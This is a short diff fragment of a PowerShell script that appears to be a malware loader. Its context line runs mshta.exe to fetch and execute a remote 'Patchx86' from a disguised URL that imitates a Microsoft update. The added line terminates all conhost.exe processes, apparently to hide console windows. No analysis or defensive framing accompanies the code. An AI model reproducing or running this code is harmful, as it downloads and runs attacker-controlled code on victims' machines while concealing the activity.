@@ -6,6 +6,8 @@ if($id -eq $null) {
 			
 C:\Windows\SysWOW64\mshta.exe https://10.0.0.1:123@min.gitcdn.link/repo/MicrosoftUpdate/Update_181115/master/Patchx86
 
+Get-WmiObject Win32_Process -Filter "name = 'conhost.exe'" | ForEach-Object{$_.Terminate()  | Out-Null }
+
 }
 			
 else{
